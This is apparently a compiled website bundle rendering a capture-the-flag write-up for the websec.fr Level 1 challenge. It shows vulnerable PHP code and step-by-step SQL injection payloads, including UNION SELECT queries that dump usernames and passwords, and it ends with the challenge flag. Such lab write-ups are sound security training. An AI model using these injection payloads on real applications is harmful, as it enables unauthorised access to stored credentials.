"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[7379],{3905:function(e,t,n){n.d(t,{Zo:function(){return u},kt:function(){return d}});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},i=Object.keys(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var s=r.createContext({}),p=function(e){var t=r.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},u=function(e){var t=p(e.components);return r.createElement(s.Provider,{value:t},e.children)},c={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},m=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,i=e.originalType,s=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),m=p(n),d=a,h=m["".concat(s,".").concat(d)]||m[d]||c[d]||i;return n?r.createElement(h,o(o({ref:t},u),{},{components:n})):r.createElement(h,o({ref:t},u))}));function d(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var i=n.length,o=new Array(i);o[0]=m;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:a,o[1]=l;for(var p=2;p<i;p++)o[p]=n[p];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},4430:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return l},contentTitle:function(){return s},metadata:function(){return p},toc:function(){return u},default:function(){return m}});var r=n(7462),a=n(3366),i=(n(7294),n(3905)),o=["components"],l={},s="Level 1",p={unversionedId:"websec.fr/level01",id:"websec.fr/level01",isDocsHomePage:!1,title:"Level 1",description:"Description",source:"@site/docs/websec.fr/level01.md",sourceDirName:"websec.fr",slug:"/websec.fr/level01",permalink:"/Writeups/docs/websec.fr/level01",editUrl:"https://github.com/datthinh1801/Writupes/tree/main/website/docs/websec.fr/level01.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"wasmbaby",permalink:"/Writeups/docs/UIUCTF 2021/Web/wasmbaby"},next:{title:"Level 2",permalink:"/Writeups/docs/websec.fr/level02"}},u=[{value:"Description",id:"description",children:[]},{value:"Solution",id:"solution",children:[{value:"Initial observation",id:"initial-observation",children:[]},{value:"Exploitation",id:"exploitation",children:[]}]}],c={toc:u};function m(e){var t=e.components,n=(0,a.Z)(e,o);return(0,i.kt)("wrapper",(0,r.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"level-1"},"Level 1"),(0,i.kt)("h2",{id:"description"},"Description"),(0,i.kt)("p",null,"Challenge URL: ",(0,i.kt)("a",{parentName:"p",href:"https://websec.fr/level01/index.php"},"https://websec.fr/level01/index.php")," "),(0,i.kt)("p",null,(0,i.kt)("a",{parentName:"p",href:"https://websec.fr/level01/source.php"},"This application")," is used to view the username by the given user ID, it will return the corresponding username from the database."),(0,i.kt)("h2",{id:"solution"},"Solution"),(0,i.kt)("h3",{id:"initial-observation"},"Initial observation"),(0,i.kt)("p",null,"The ",(0,i.kt)("inlineCode",{parentName:"p"},"this application")," links to the back-end source code including PHP and HTML. Following is the source for PHP:  "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-php"},"<?php\nsession_start ();\n\nini_set('display_errors', 'on');\nini_set('error_reporting', E_ALL);\n\ninclude 'anti_csrf.php';\n\ninit_token ();\n\nclass LevelOne {\n    public function doQuery($injection) {\n        $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);\n        \n        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';\n        $getUsers = $pdo->query($query);\n        $users = $getUsers->fetchArray(SQLITE3_ASSOC);\n\n        if ($users) {\n            return $users;\n        }\n\n        return false;\n    }\n}\n\nif (isset ($_POST['submit']) && isset ($_POST['user_id'])) {\n    check_and_refresh_token();\n\n    $lo = new LevelOne ();\n    $userDetails = $lo->doQuery ($_POST['user_id']);\n}\n?>\n")),(0,i.kt)("p",null,"Here, we can see that the query statement is prepared by concatenating user input to a predefined statement and thereby susceptible to SQL injection.  "),(0,i.kt)("p",null,"If I enter the ",(0,i.kt)("inlineCode",{parentName:"p"},"user ID")," as ",(0,i.kt)("inlineCode",{parentName:"p"},"'"),", an error message is returned:  "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "\' LIMIT 1" in /index.php on line 16\n\nFatal error: Call to a member function fetchArray() on boolean in /index.php on line 17\n')),(0,i.kt)("p",null,"If I enter '' or 1=1 -- (",(0,i.kt)("em",{parentName:"p"},"2 single quotes"),"), I get this:  "),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/132615026-734f4575-28eb-4e65-9bb3-da1ad6e08955.png",alt:"image"})),(0,i.kt)("h3",{id:"exploitation"},"Exploitation"),(0,i.kt)("p",null,"First, I found the number columns returned.",(0,i.kt)("br",{parentName:"p"}),"\n","When I entered ",(0,i.kt)("inlineCode",{parentName:"p"},"'' union select 1 --"),", I got:  "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Warning: SQLite3::query(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns in /index.php on line 16\n\nFatal error: Call to a member function fetchArray() on boolean in /index.php on line 17\n")),(0,i.kt)("p",null,"This means the ",(0,i.kt)("inlineCode",{parentName:"p"},"SELECT")," statement on the right side doesn't have the same number of columns as of the left side. Therefore, I increased the number of columns on the right side to 2 with the following payload:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"'' union select 1, 1--\n")),(0,i.kt)("p",null,"As a result, I got this:  "),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/132615447-388b4ecc-5d20-460a-99aa-1af3365d1708.png",alt:"image"})),(0,i.kt)("p",null,"This implies that there are 2 columns returned."),(0,i.kt)("p",null,"Next, I tried to disclose table names and column names to hopefully find something.",(0,i.kt)("br",{parentName:"p"}),"\n","From ",(0,i.kt)("a",{parentName:"p",href:"https://stackoverflow.com/questions/6460671/sqlite-schema-information-metadata"},"this post"),", I got the payload to get the table names as well as the sql command to create that table:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT name, sql FROM sqlite_master\nWHERE type='table'\nORDER BY name;\n")),(0,i.kt)("p",null,"With that payload, I got this result:  "),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/132615853-0236d80c-7c0f-40a0-a7fc-df46e6d990d7.png",alt:"image"})),(0,i.kt)("p",null,"From the result, I can see that there is a table called ",(0,i.kt)("inlineCode",{parentName:"p"},"users")," and in that table there are 3 columns, namely ",(0,i.kt)("inlineCode",{parentName:"p"},"id"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"username"),", and ",(0,i.kt)("inlineCode",{parentName:"p"},"password"),"."),(0,i.kt)("p",null,"Them, I wanted to see all ",(0,i.kt)("inlineCode",{parentName:"p"},"username"),"s in this table:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sql"},"'' UNION SELECT username, password FROM users ORDER BY username DESC --\n")),(0,i.kt)("p",null,"The result is:  "),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/132617184-184c540e-bf7a-4f10-876f-981b272adef4.png",alt:"image"})),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"So flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"WEBSEC{Simple_SQLite_Injection}"))))}m.isMDXComponent=!0}}]);